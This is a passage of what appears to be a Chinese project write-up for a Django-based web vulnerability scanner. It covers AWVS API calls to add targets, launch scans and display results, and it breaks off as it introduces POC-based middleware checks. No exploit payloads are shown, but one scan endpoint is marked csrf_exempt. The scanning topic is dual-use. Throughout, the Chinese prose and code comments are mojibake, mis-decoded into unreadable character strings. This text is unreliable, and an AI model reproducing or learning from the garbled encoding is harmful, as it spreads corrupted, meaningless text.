src=\"https://jwt1399.top/medias/avatar.png\"></td>    \n\t\t<td style=\"text-align:center;\"><img width=\"200\" src=\"https://upload.jianshu.io/users/upload_avatars/16052738/fffbc8fc-a9c3-4a1c-ad56-157c32f57f79?imageMogr2/auto-orient/strip|imageView2/1/w/240/h/240\"></td>  \n\t\t<td style=\"text-align:center;\" ><img width=\"200\" src=\"https://pic3.zhimg.com/v2-6fb8dc878b496af2ec012c1f001865b2_xl.jpg\"></td>\n\t\t<td style=\"text-align:center;\"><img width=\"200\" src=\"https://tse2-mm.cn.bing.net/th/id/OIP.84TQxrsYyNGXAkgvPHEtyQAAAA?w=165&h=180&c=7&o=5&dpr=1.25&pid=1.7\"></td>  \n   </tr>\n </tbody></table>\n\n\n\n###  ç›¸å…³æŠ€æœ¯\n\n|      åç§°      |    ç‰ˆæœ¬     |\n| :------------: | :---------: |\n|     Python     |    3.7.0    |\n|     Django     |    3.1.4    |\n|     SQLite     |   3.35.2    |\n|    ECharts     |    5.0.1    |\n|     Tabler     | 1.0.0-beta2 |\n|    SimpleUI    |  2021.1.1   |\n|    Docsify     |   4.11.6    |\n|     Layer      |    3.2.0    |\n| Boostrap Table |   1.18.2    |\n\n### é¡¹ç›®åŠŸèƒ½\n\n![](https://img.jwt1399.top//img/20210617154357.png)\n\n## é¡¹ç›®é¦–é¡µ\n\né¦–é¡µé‡‡ç”¨ ECharts å¯¹æ¼æ´æ‰«æçš„æ¼æ´ç­‰çº§ã€æŒ‡çº¹è¯†åˆ«ç»„ä»¶ã€å®‰å…¨å¯¼èˆªæ•°æ®åšäº†å¯è§†åŒ–å›¾è¡¨å±•ç¤ºï¼Œå›¾è¡¨çš„é£æ ¼æ²¡æœ‰ç»Ÿä¸€ï¼Œå‡‘åˆçœ‹å§ğŸ˜‚\n\n![ä»ªè¡¨ç›˜é¡µ](https://img.jwt1399.top//img/20210618105902.png)\n\n## èº«ä»½éªŒè¯\n\n> æ–°ç”¨æˆ·æƒ³è¦ä½¿ç”¨ç³»ç»ŸåŠŸèƒ½å¿…é¡»è¦æ³¨å†Œç™»å½•ï¼Œæ¸¸å®¢åªèƒ½è®¿é—®éƒ¨åˆ†é¡µé¢ã€‚æœ¬ç³»ç»Ÿæœ‰æ™®é€šç”¨æˆ·å’Œè¶…çº§ç”¨æˆ·ã€‚æ™®é€šç”¨æˆ·å¯ä»¥ä½¿ç”¨æœ¬ç³»ç»Ÿçš„æ‰€æœ‰åŠŸèƒ½ï¼Œä½†æ˜¯ä¸èƒ½ç™»å½•åå°ç®¡ç†ç³»ç»Ÿã€‚è¶…çº§ç”¨æˆ·ä¸ä»…å¯ä»¥ä½¿ç”¨æ‰€ç”¨åŠŸèƒ½è¿˜å¯ä»¥ç™»å½•åå°ç®¡ç†ç³»ç»Ÿä¸­æ‰€æœ‰çš„ç”¨æˆ·æƒé™å’Œæ•°æ®ã€‚\n\n **è®¾è®¡æ€è·¯ï¼š**ç™»å½•å’Œæ³¨å†Œæ¨¡å—åœ¨ Django è‡ªå¸¦çš„è®¤è¯æ¨¡å—çš„åŸºç¡€ä¸Šè¿›è¡Œå®ç°ï¼Œå› æ­¤åœ¨`åå°-->ç”¨æˆ·ä¸æˆæƒ`å°±å¯å¯¹æ³¨å†Œç”¨æˆ·è¿›è¡Œæƒé™åˆ†é…å’Œç›¸åº”ç®¡ç†ã€‚æˆ‘ä»¬ä½¿ç”¨ Django è‡ªå¸¦çš„æ•°æ®åº“ SQLite æ¥å­˜æ”¾è´¦æˆ·ä¿¡æ¯ï¼Œé‡æ„äº†æ•°æ®åº“è¡¨`auth_user`è¡¨ï¼Œå¢åŠ äº†ç”¨æˆ·é‚®ç®±å­—æ®µï¼Œauth_user ä¸­å¯†ç å­—æ®µæ˜¯åŠ äº† salt çš„ sha256 å€¼å†ç»è¿‡ base64 ç¼–ç ä¹‹åçš„å€¼ï¼Œä¿éšœäº†ç”¨æˆ·çš„ä¿¡æ¯å®‰å…¨ã€‚\n\n![auth_user](https://img.jwt1399.top//img/20210618113948.png)\n\n| ç™»å½•é¡µ | ![](https://img.jwt1399.top//img/20210421020945.png) |\n| ------ | ---------------------------------------------------- |\n| æ³¨å†Œé¡µ | ![](https://img.jwt1399.top//img/20210421001457.png) |\n\né‡è®¾å¯†ç åŠŸèƒ½è°ƒç”¨ç¬¬ä¸‰æ–¹åŒ… `django-password-reset` è¿›è¡Œå®ç°\n\n| æ­¥éª¤ä¸€ | ![](https://img.jwt1399.top//img/20210421020757.png) |\n| ------ | ---------------------------------------------------- |\n| æ­¥éª¤äºŒ | ![](https://img.jwt1399.top//img/20210421020803.png) |\n\n## æ¼æ´æ£€æµ‹\n\n> è¯¥æ¨¡å—ä¸»è¦æ˜¯å¯¹ç›®æ ‡Webç³»ç»Ÿè¿›è¡Œå®‰å…¨æ¼æ´æ‰«æï¼ŒåŒ…æ‹¬SQLæ³¨å…¥ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€å¼±å¯†ç ã€ä¸­é—´ä»¶æ¼æ´ã€‚ä¸­é—´ä»¶æ¼æ´æ‰«æåŒ…æ‹¬å¯¹Weblogicã€Struts2ã€Tomcat ã€Jbossã€Drupalã€Nexusçš„å·²çŸ¥æ¼æ´è¿›è¡Œæ£€æµ‹ï¼Œç”¨æˆ·æä¾›ç›®æ ‡URLå¹¶é€‰æ‹©CVEæ¼æ´ç¼–å·ã€‚\n\n###  è®¾è®¡æ€è·¯\n\nè¯¥æ¨¡å—çš„å…¨æ‰«æã€SQLæ³¨å…¥æ¼æ´æ‰«æã€XSSæ¼æ´æ‰«æã€å¼±å£ä»¤æ‰«æã€ä»…çˆ¬å–æ˜¯è°ƒç”¨ AWVS API è¿›è¡Œå®ç°ã€‚ä¸­é—´ä»¶æ¼æ´æ‰«ææ˜¯åŸºäºè„šæœ¬æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚å®ç°ã€‚æ ¹æ®æ¼æ´å½¢æˆçš„åŸå› ï¼Œç”Ÿæˆä¸€äº›æµ‹è¯• payload å‘é€åˆ°ç›®æ ‡ç³»ç»Ÿï¼Œå†ç”±è¿”å›çš„çŠ¶æ€ç å’Œæ•°æ®æ¥åˆ¤æ–­payloadæ˜¯å¦æœ‰æ•ˆã€‚\n\n### å®ç°æ•ˆæœ\n\n![æ¼æ´æ‰«æ](https://img.jwt1399.top//img/20210617161157.png)\n\nç‚¹å‡»æ‰«æç›®æ ‡è·³è½¬åˆ°æ¼æ´ç»“æœé¡µï¼š\n\n![æ¼æ´ç»“æœ](https://img.jwt1399.top//img/20210619102157.png)\n\nå†ç‚¹å‡»æ‰«æç›®æ ‡çš„è·³è½¬åˆ°æ¼æ´è¯¦æƒ…é¡µï¼š\n\n![æ¼æ´è¯¦æƒ…](https://img.jwt1399.top//img/20210619102149.png)\n\n### è¯¦ç»†å®ç°\n\n#### æ·»åŠ æ‰«æç›®æ ‡\n\næ¼æ´æ‰«ææœ€å¼€å§‹çš„å·¥ä½œæ˜¯æ·»åŠ æ‰«æç›®æ ‡åˆ° AWVS çš„æ‰«æé˜Ÿåˆ—ä¸­ã€‚AWVS æä¾›äº†ä¸€ä¸ª API æ¥å£: `/api/v1/targets`ï¼Œä½¿ç”¨ POST è¯·æ±‚ï¼Œ POST è¯·æ±‚å‚æ•°ä¸ºï¼š`{\"address\":\"XXXX.XXXX.XXXX\",\"description\":\"xxxx\",\"criticality\":\"10\"}`ã€‚\n\nå½“ç›®æ ‡æ·»åŠ æˆåŠŸåä¼šè¿”å›ä¸€ä¸ª target_id ï¼Œè¿™ä¸ªå€¼åœ¨æ‰€æœ‰æ‰«æä¸­æ˜¯å”¯ä¸€çš„ã€‚é€šè¿‡ target_id åˆ¤æ–­ç›®æ ‡æ˜¯å¦æ·»åŠ æˆåŠŸã€‚æ·»åŠ å®Œç›®æ ‡åå¹¶æ²¡æœ‰å¼€å§‹æ‰«æï¼Œéœ€è¦ä½¿ç”¨å¦ä¸€ä¸ª API æ¥å£ï¼š`/api/v1/scans`ï¼Œä½¿ç”¨ POST è¯·æ±‚ï¼Œä¼ å…¥åˆšåˆšæ·»åŠ ç›®æ ‡ç”Ÿæˆçš„ target_id å’Œç”¨æˆ·é€‰æ‹©çš„æ‰«æç±»å‹ï¼ŒPOST è¯·æ±‚å‚æ•°ä¸ºï¼š`{\"target_id\":\"xxxxxxx\",\"profile_id\":\"xxxxxxx\"}`ã€‚å¼€å§‹æ‰«æå°†ä¼šè¿”å›çŠ¶æ€ç 200ã€‚\n\nä½¿ç”¨ Python çš„ç¬¬ä¸‰æ–¹åº“ requests æ¥å®ç° API æ¥å£è®¿é—®ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹:\n\n```python\n#Target: POSTè¯·æ±‚/api/v1/targets\ntry:\n\t#dataåŒ…å«ç›®æ ‡URLå’Œç±»å‹ï¼Œauth_headersåŒ…å«API_KEY\n   \tresponse = requests.post(targets_api, auth_headers, data, False)\nresult = response.json()\ntarget_id = result.get('target_id')\n   \treturn target_id\nexcept Exception:\nreturn None\n#Scan: POSTè¯·æ±‚/api/v1/scans\ntry:\n    response = requests.post(scan_api, data, auth_headers, False)\n    status_code = 200\nexcept Exception:\nstatus_code = 404\nreturn status_code\n```\n\nAPI æ¥å£å·²ç»å®ç°ï¼Œè¿˜éœ€è¦è·å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚ç”±äºæœ¬ç³»ç»Ÿæ˜¯åŸºäº Django å®ç°çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ HTML+JavaScript æä¾›ç”¨æˆ·ç•Œé¢å’Œæ¥å—å’Œå‘é€æ•°æ®åˆ°åç«¯ï¼Œåç«¯ä½¿ç”¨ Python å®ç°ã€‚é¦–å…ˆåœ¨ **urls.py** é‡Œé¢åŠ å…¥æ·»åŠ è®¿é—®è·¯å¾„\n\n`path('vuln_scan', views.vuln_scan, name='vuln_scan')`\n\nåœ¨ **views.py** ä¸­å®šä¹‰ `vuln_scan()` å‡½æ•°æ¥æ”¶å‰ç«¯çš„ç”¨æˆ·è¾“å…¥ï¼Œå¹¶è°ƒç”¨å·²ç»å†™å¥½çš„ API å‡½æ•°ã€‚ç”¨æˆ·è¾“å…¥çš„ url ä¸ºæ‰«æçš„ç›®æ ‡ï¼Œæ‰«æç±»å‹åŒ…æ‹¬SQLæ³¨å…¥ã€XSSæ¼æ´ã€å¼±å£ä»¤å’Œå…¨æ‰«æï¼Œå…¶ä¸­å…¨æ‰«æå°±æ˜¯æ‰«ææ‰€æœ‰ç±»å‹çš„æ¼æ´ï¼Œå¦‚æœæ·»åŠ æˆåŠŸåè¿”å›çš„ target_id ä¸æ˜¯ Noneï¼Œè¯´æ˜æ·»åŠ æˆåŠŸï¼Œå°±å¯ä»¥å¼€å§‹è°ƒç”¨å¼€å§‹æ‰«æçš„ APIï¼Œå¼€å§‹æ‰«æåè¿”å›çŠ¶æ€ç ï¼Œä¸º200åˆ™å¼€å§‹æ‰«æï¼Œè¿”å›æˆåŠŸå¦åˆ™è¿”å›å¤±è´¥ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```python\n@csrf_exempt\ndef vuln_scan(request):\n    #é€šè¿‡POSTè¯·æ±‚è·å–ç”¨æˆ·è¾“å…¥çš„URLå’Œæ‰«æç±»å‹\n    url = request.POST.get('ip')\n    scan_type = request.POST.get('scan_type')\n    t = Target(API_URL, API_KEY)\n    #å°†ç›®æ ‡URLæ·»åŠ åˆ°æ‰«æé˜Ÿåˆ—ä¸­\n    target_id = t.add(url)\n    #å¦‚æœtarget_idä¸ä¸ºNone,åˆ™å¼€å§‹æ‰«æ\n    if target_id is not None:\n        s = Scan(API_URL, API_KEY)\n        status_code = s.add(target_id, scan_type)\n        if status_code == 200:\n            return success()\n    return error()\n```\n\næœ€åä½¿ç”¨ JavaScript æ¥å®ç°å‘é€ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œé€‰æ‹©é€šè¿‡ POST æ–¹æ³•å‘é€æ•°æ®ï¼Œå¹¶åœ¨å‘é€ä¹‹å‰åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„åˆæ³•æ€§ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹:\n\n```javascript\nfunction get_scan_info(ip , scan_type) {\n#ä½¿ç”¨POSTè¯·æ±‚å‘é€ç”¨æˆ·è¾“å…¥\n        $.post('/vuln_scan', {\n            ip: ip ,\n            scan_type: scan_type\n        }, function (data) {\n            if (data.code !== 200) {\n                ......\n            } else {\n                ...... \n            }\n           ......});\n    }\nvar domain = $('input[name=scan_url]').val();\n#ä½¿ç”¨å¾ªç¯åˆ¤æ–­ç”¨æˆ·é€‰æ‹©çš„æ‰«æç±»å‹\nfor(var i=0; i<document.getElementsByName(\"scan_type\").length; i++) {\n    if (document.getElementsByName(\"scan_type\")[i].checked) {\n      var scan_type=document.getElementsByName(\"scan_type\")[i].value;\n    }\n}\nif(domain){\n\tget_scan_info(domain,scan_type)\n}else{\n\t......\n}\n```\n\næ€»ä½“æ¥è¯´ï¼Œé€šè¿‡ä¸Šè¿°çš„ä»£ç å®ç°ï¼Œå®ç°äº†å°†ç”¨æˆ·è¾“å…¥é€šè¿‡ JavaScript ä¼ è¾“ç»™åå°ï¼Œåå°æ¥æ”¶æ•°æ®åå°†è°ƒç”¨ AWVS APIï¼Œç„¶å AWVS å¼€å§‹æ ¹æ®ç”¨æˆ·è¾“å…¥å¼€å§‹æ‰«æç›®æ ‡ URLï¼Œæ‰«æç»“æŸåå°†ç»“æœä¿å­˜åœ¨æ•°æ®åº“ä¸­ã€‚å®ç°æ•ˆæœå¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top//img/20210619104620.png)\n\n#### è·å–æ‰«æç»“æœ\n\nåœ¨ä¸Šä¸€å°èŠ‚ä¸­ï¼Œå°†ç›®æ ‡æ‰«æçš„ç»“æœä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¾—åˆ°æ‰€æœ‰çš„æ‰«æç›®æ ‡ï¼Œ`â€˜/api/v1/scansâ€˜`ï¼Œè¯·æ±‚æ–¹å¼ä¸º GETï¼Œè¯·æ±‚æˆåŠŸåä¼šè¿”å›æ‰€æœ‰æ‰«æç›®æ ‡çš„ä¿¡æ¯ï¼Œåˆ©ç”¨è¿™ä¸ª API å¯ä»¥å®ç°å±•ç¤ºæ‰€æœ‰æ‰«æç›®æ ‡ã€‚è¦å®ç°å±•ç¤ºæ¯ä¸ªæ‰«æç›®æ ‡çš„æ‰€æœ‰æ¼æ´çš„åŠŸèƒ½ï¼Œéœ€è¦æŒ‰ç…§ target_id æ¥åœ¨æ‰€æœ‰æ‰«æç›®æ ‡ä¸­æœç´¢ã€‚AWVS ä¹Ÿæä¾›äº†ç›¸åº”çš„ APIï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„ API ä¸ºï¼š`/api/v1/vulnerabilities`\n\n`?q=severity:{int};criticality:{int};status:{string};cvss_score:{logicexpression};cvss_score:{logicexpression};target_id:{target_id};group_id:{group_id}`ã€‚è¯·æ±‚æ–¹å¼ä¸º GETã€‚åˆ©ç”¨ target_id æœç´¢æ¯ä¸ªæ‰«æç›®æ ‡ã€‚è¿™ä¹Ÿè§£å†³äº†æ¼æ´ç»†èŠ‚é¡µé¢çš„ URL é—®é¢˜ã€‚å½“ä½¿ç”¨ target_id æœç´¢æ‰«æç›®æ ‡æˆåŠŸæ—¶å°†ä¼šè¿”å›è¿™ä¸ªç›®æ ‡çš„æ‰€æœæ¼æ´ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿™ä¸ªç›®æ ‡åŒ…å«çš„æ¼æ´ä¸ªæ•°ã€æ¯ä¸ªæ¼æ´çš„å±é™©ç­‰çº§ã€æ‰«ææ—¶é—´ã€æ‰«æç±»å‹ã€æ‰«æçŠ¶æ€ç­‰ä¿¡æ¯ã€‚\n\nå…·ä½“å®ç°æ­¥éª¤å’Œæ·»åŠ æ‰«æç›®æ ‡å¤§ä½“ç›¸ä¼¼ï¼Œé¦–å…ˆç¬¬ä¸€æ­¥ä½¿ç”¨ requests æ¥å®ç° API è¯·æ±‚ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```python\n#è·å–æ‰€æœ‰æ‰«æç›®æ ‡\nresponse=requests.get(scan_api, self.auth_headers, False) \nscan_response=response.json().get('scans')\nfor scan in scan_response:\n   scan['request_url'] = request_url\n   scan_list.append(scan)\nreturn scan_list\n#æœç´¢çŠ¶æ€ä¸ºâ€œopenâ€œ,å¯¹åº”target_idçš„æ‰«æç›®æ ‡\nvuln_search_api=f'{vuln_api}?q=status:{status};target_id:{target_id}'\ntry:\n#ä½¿ç”¨getæ–¹å¼è¯·æ±‚\n    response = requests.get(vuln_search_api, auth_headers, False)\n#è¿”å›æœç´¢ç»“æœç›®æ ‡çš„æ‰€æœ‰æ¼æ´ä¿¡æ¯\n    return response.text\nexcept Exception:\n    return None\n```\n\nåœ¨ **urls.py** ä¸­åŠ å…¥ç”¨æˆ·è®¿é—®çš„ url ï¼Œè¿™ä¸ªéœ€è¦æä¾›ä¸€ä¸ª target_id æ–¹ä¾¿åç»­åŠŸèƒ½çš„å®ç°ï¼Œå…ˆè·å–æ‰€æœ‰ç›®æ ‡çš„target_idï¼Œç„¶åä½¿ç”¨å¾ªç¯å°†æ‰€æœ‰ target_id åŠ å…¥åˆ° urlpatterns åˆ—è¡¨ä¸­ã€‚å› ä¸ºåœ¨ Django ä¸­ views å‡½æ•°é€šå¸¸åªèƒ½ä½¿ç”¨ä¸€ä¸ª request å‚æ•°ï¼Œç”±äºè¿™é‡Œéœ€è¦å°† target_id ä¼ å…¥åˆ° views å‡½æ•°ä¸­ï¼Œä½¿ç”¨æ­£åˆ™åŒ¹é…çš„ `â€œ(?P<target_id>.*)$â€` æ¥æ”¶ä¼ å…¥çš„ target_idï¼Œåœ¨ views é‡Œå¯¹åº”å‡½æ•°çš„ç¬¬äºŒä¸ªå½¢å‚åå¿…é¡»å’Œ `<>` é‡Œçš„å€¼ä¸€è‡´æ‰æœ‰æ•ˆã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```python\npath('vulnscan', views.vulnscan, name=\"vulnscan\"),\nfor target_id in target_ids:\n\t  #ä½¿ç”¨æ­£åˆ™åŒ¹é…è·å–ç¬¬äºŒä¸ªå‚æ•°ï¼štaget_id\nurlpatterns.append(url(r'^vuln_result/(?P<target_id>.*)$', views.vuln_result, name='vuln_result/'+target_id))\n```\n\nåœ¨ **views.py** é‡Œå®šä¹‰å‡½æ•° `vulnscan(request)` è·å–æ‰€æœ‰å¯¹åº”çš„ç›®æ ‡æ¼æ´ä¿¡æ¯ã€‚ä½¿ç”¨ API å¾—åˆ°è¿”å›çš„æ¼æ´å±é™©ç­‰çº§ã€æ‰«æç›®æ ‡URLã€æ¯ä¸ªæ¼æ´å”¯ä¸€æ ‡è¯†çš„ vuln_idã€æ‰«æç±»å‹ã€æ‰«æå¤„ç†æ—¶é—´ï¼ŒAPI è¿”å›çš„æ‰«æå¤„ç†æ—¶é—´ä¸æ˜¯æ ‡å‡†çš„æ—¶é—´æ ¼å¼ï¼Œä½¿ç”¨æ­£åˆ™åŒ¹é…çš„æ–¹å¼ï¼Œå°†å…¶è½¬æ¢ä¸º `â€œ%Y-%m-%d %H:%M:%Sâ€œ` çš„æ ¼å¼ï¼Œå†å®šä¹‰å‡½æ•° `vuln_result(request,target_id)`ï¼Œæ ¹æ® target_id è·å–æ‰«æç›®æ ‡ä¸­æ‰€æœ‰æ¼æ´ä¿¡æ¯ï¼ŒåŒ…æ‹¬å­˜åœ¨æ¼æ´çš„URLã€æ¼æ´ç±»å‹ã€çŠ¶æ€å’Œå¤„ç†æ—¶é—´ç­‰ä¿¡æ¯ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```python\n@login_required\ndef vuln_result(request, target_id):\n    d = Vuln(API_URL, API_KEY)\n    data = []\n    vuln_details = json.loads(d.search(None,None, \"open\", target_id=str(target_id)))\n\n    id = 1\n    for target in vuln_details['vulnerabilities']:\n        item={\n            'id': id,\n            'severity': target['severity'],\n            'target': target['affects_url'],\n            'vuln_id':target['vuln_id'],\n            'vuln_name': target['vt_name'],\n            'time': re.sub(r'T|\\..*$', \" \", target['last_seen'])\n        }\n        id += 1\n        data.append(item)\n    return render(request,'vuln-reslut.html',{'data': data})\n```\n\nåœ¨è¿™ä¸ªå­åŠŸèƒ½ä¸­ï¼Œå‰ç«¯çš„æ•°æ®å±•ç¤ºä½¿ç”¨çš„æ˜¯ Bootstrap Tableã€‚è¿™ä¸ªæ¨¡æ¿æœ‰å¾ˆå¤šå®ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚è¡¨æ ¼çš„æœç´¢åŠŸèƒ½ã€åˆ†é¡µå±•ç¤ºåŠŸèƒ½ç­‰ç­‰ï¼Œå¢åŠ äº†ç”¨æˆ·ä½“éªŒã€‚è¡¨æ ¼çš„æ•°æ®åœ¨ HTML ä¸­ä½¿ç”¨åŒèŠ±æ‹¬å·æ¥æ¥æ”¶ï¼Œåœ¨ **views.py** å‡½æ•°ä¸­è¿”å›çš„åˆ°ç›¸åº”çš„ HTML é¡µé¢æ—¶ï¼Œå°† data å­—å…¸ä¸€èµ·è¿”å›ã€‚è¿™æ ·çš„è¿”å›æ–¹å¼å¯ä»¥å°†ä½¿ç”¨å­—å…¸ä¸­çš„ key å€¼è·å–å¯¹åº”çš„ values å€¼ã€‚è¿˜å¯ä»¥æ˜¯ä½¿ç”¨ if-elseã€for ç­‰è¯­å¥æ¥åˆ†ç±»å±•ç¤ºæ•°æ®ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```django\n{% for item in data %}\nâ€¦â€¦â€¦â€¦â€¦\n# è¿™ä¸ªåªå±•ç¤ºäº†æ‰«æç›®æ ‡åˆ—ï¼Œå…¶ä»–åˆ—ç±»ä¼¼ \n<a href=\"/vuln_detail/{{ item.vuln_id }}\"> {{ item.target }}</a>\nâ€¦â€¦â€¦â€¦â€¦\n{% endfor %}\n```\n\næœ€åå®ç°çš„æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ ¹æ®æ¯ä¸ªæ‰«æçŠ¶æ€ä¸åŒæœ‰ä¸åŒçš„æ˜¾ç¤ºï¼Œä½¿ç”¨çº¢é»„è“ç»¿æ¥åˆ†ç±»é«˜å±ã€ä¸­å±ã€ä½å±ã€infoç­‰çº§çš„æ¼æ´ã€‚æœ€åå±•ç¤ºäº†æ‰«æçš„å¤„ç†æ—¶é—´ã€‚\n\n![](https://img.jwt1399.top//img/20210619110224.png)\n\nè¡¨æ ¼ä¸­æ‰«æç›®æ ‡åˆ—å¯ä»¥ç‚¹å‡»è¿›å…¥æŸ¥çœ‹ç›®æ ‡çš„æ‰€æœ‰æ¼æ´ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå±•ç¤ºäº†ç‰¹å®šçš„æ‰«æç›®æ ‡æ¯ä¸ªæ¼æ´çš„å±é™©ç­‰çº§ã€å­˜åœ¨æ¼æ´çš„URLã€æ¼æ´çš„ç±»å‹ã€‚\n![](https://img.jwt1399.top//img/20210619102157.png)\n\n#### è·å–æ¼æ´ç»†èŠ‚\n\nåœ¨å®ç°æ¼æ´æ‰«æå’Œç»“æœå±•ç¤ºåï¼Œè¿˜éœ€è¦è·å–æ¯ä¸ªæ¼æ´çš„ç»†èŠ‚ã€‚åŒ…æ‹¬å¯¼è‡´æ¼æ´çš„è¯·æ±‚å‚æ•°ã€æµ‹è¯•çš„ payloadã€æ•°æ®è¯·æ±‚åŒ…ã€ç®€è¦çš„ä¿®å¤å»ºè®®ç­‰ç­‰ã€‚å› ä¸ºæ¯ä¸ªæ¼æ´ä¹Ÿå­˜åœ¨ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯† vuln_idï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ªå€¼æŸ¥è¯¢æŒ‡å®šæ¼æ´çš„æ‰€æœ‰ä¿¡æ¯ã€‚ä½¿ç”¨çš„ API ä¸ºï¼š`/api/v1/vulnerabilities/{vuln_id}`ï¼Œè¯·æ±‚æ–¹å¼ä¸º GETã€‚\n\n åŒæ ·åœ°ï¼Œé¦–å…ˆä½¿ç”¨ requests æ¥å®ç° API çš„è°ƒç”¨ï¼Œä¼ å…¥ vuln_id æ¥æŸ¥è¯¢æŒ‡å®šæ¼æ´çš„æ‰€æœ‰ä¿¡æ¯ï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```python\n#è·å–æŒ‡å®šæ¼æ´çš„ç›¸å…³ä¿¡æ¯\ndef get(self, vuln_id):\n    vuln_get_api = f'{self.vuln_api}/{vuln_id}'\n    try:\n\t\t#ä½¿ç”¨GETè¯·æ±‚å°†vuln_idä¼ ç»™APIï¼Œç»“æœä»¥jsonæ ¼å¼è¿”å›\n        response = requests.get(vuln_get_api, auth_headers, False)\n        return response.json()\n    except Exception:\n        return None\n```\n\nåœ¨ **urls.py** ä¸­æ·»åŠ æ¼æ´ç»†èŠ‚çš„ urlï¼Œè¿™é‡Œä¸ä¸Šä¸€èŠ‚å±•ç¤ºæ‰«æç›®æ ‡çš„æ‰€æœ‰æ¼æ´ç±»ä¼¼ï¼Œéƒ½ç”¨æ­£åˆ™åŒ¹é…çš„å½¢å¼æ¥æ”¶ **views.py**é‡Œå‡½æ•°çš„ç¬¬äºŒä¸ªå½¢å‚ï¼Œä½†æ˜¯è¿™é‡Œä¸åœ¨ä½¿ç”¨ target_id è€Œæ˜¯ä½¿ç”¨ vuln_idã€‚ä»£ç å¦‚ä¸‹ï¼š\n\n```python\nfor vuln_id in vuln_ids:\n\turlpatterns.append(url(r'^vuln_detail/(?P<vuln_id>.*)$', views.vuln_detail, name='vuln_detail/' + vuln_id))\n```\n\nåœ¨ **views.py** é‡Œé¢å®šä¹‰ `vuln_details(request,vuln_id)` å‡½æ•°ï¼Œæ ¹æ® vuln_id æŸ¥è¯¢æŒ‡å®šæ¼æ´çš„ç›¸å…³ä¿¡æ¯ã€‚è¯¥å‡½æ•°å°† API è¿”å›çš„å€¼ä¸­æœ‰ç”¨çš„ä¿¡æ¯æå–å‡ºæ¥åˆ°å­—å…¸ data é‡Œï¼Œè¿”å›ç»™ vuln-details.html é¡µé¢ï¼Œä½¿ç”¨ åŒèŠ±æ‹¬å· æ¥æ¥æ”¶è¯¥æ¼æ´çš„å—å½±å“çš„URLã€å¤„ç†æ—¶é—´ã€æ¼æ´ç±»å‹ã€æ¼æ´æµ‹è¯•å‚æ•°ã€æ•°æ®è¯·æ±‚åŒ…ã€ç®€è¦çš„ä¿®å¤å»ºè®®ç­‰ä¿¡æ¯ã€‚å®ç°æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\n\n```python\n@login_required\ndef vuln_detail(request,vuln_id):\n    d = Vuln(API_URL,API_KEY)\n    data = d.get(vuln_id)\n    print(data)\n    parameter_list = BeautifulSoup(data['details'], features=\"html.parser\").findAll('span')\n    request_list = BeautifulSoup(data['details'], features=\"html.parser\").findAll('li')\n    data_dict = {\n        'affects_url': data['affects_url'],\n        'last_seen': re.sub(r'T|\\..*$', \" \", data['last_seen']),\n        'vt_name': data['vt_name'],\n        'details': data['details'].replace(\"  \",'').replace('</p>',''),\n        'request': data['request'],\n        'recommendation': data['recommendation'].replace('<br/>','\\n')\n    }\n    try:\n        data_dict['parameter_name'] = parameter_list[0].contents[0]\n        data_dict['parameter_data'] = parameter_list[1].contents[0]\n    except:\n        pass\n    num = 1\n    try:\n        Str = ''\n        for i in range(len(request_list)):\n            Str += str(request_list[i].contents[0])+str(request_list[i].contents[1]).replace('<strong>', '').replace('</strong>', '')+'\\n'\n            num += 1\n    except:\n        pass\n    data_dict['Tests_performed'] = Str\n    data_dict['num'] = num\n    data_dict['details'] = data_dict['details'].replace('class=\"bb-dark\"','style=\"color: #ff0000\"')\n    return render(request, \"vuln-detail.html\", {'data': data_dict})\n```\n![](https://img.jwt1399.top//img/20210619102149.png)\n\n#### åŸºäºPOCéªŒè¯çš„ä¸­é—´ä»¶æ¼æ´æ‰«æ\n\n> æœ¬ç³»ç»Ÿä½¿ç”¨POCè„šæœ¬å®ç°å¯¹ä¸€äº›ä¸­é—´ä»¶çš„æ¼æ´æ‰«æ[7]ï¼ŒåŒ…æ‹¬Weblogicã€Tomcatã€Drupalã€JBossã€Nexusã€Struts2ç­‰ç­‰ã€‚é€šè¿‡æ¯ä¸ªæ¼æ´çš„ç‰¹ç‚¹ï¼Œä½¿ç”¨Pythonç¼–å†™ä¸åŒçš„POCè„šæœ¬éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨è¯¥æ¼æ´ã€‚\n\né¦–å…ˆè¿™é‡Œçš„ç”¨æˆ·ç•Œé¢å’ŒåŸºäºAWVSçš„æ¼æ´æ‰«æå…±ç”¨ï¼Œå•ç‹¬åŠ å…¥äº†ä¸­é—´ä»¶æ¼æ´CVEç¼–å·çš„é€‰æ‹©ã€‚ä½¿ç”¨JavaScriptå‘é€ç”¨æˆ·è¾“å…¥çš„æ•°æ®åˆ°åç«¯ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```javascript\n#ä½¿ç”¨POSTè¯·æ±‚æäº¤ç”¨æˆ·çš„è¾“å…¥\nfunction get_Middleware_scan(ip , CVE_id) {\n    $.post('/Middleware_scan', {\n    ip: ip , #ç›®æ ‡URL\n    CVE_id: CVE_id  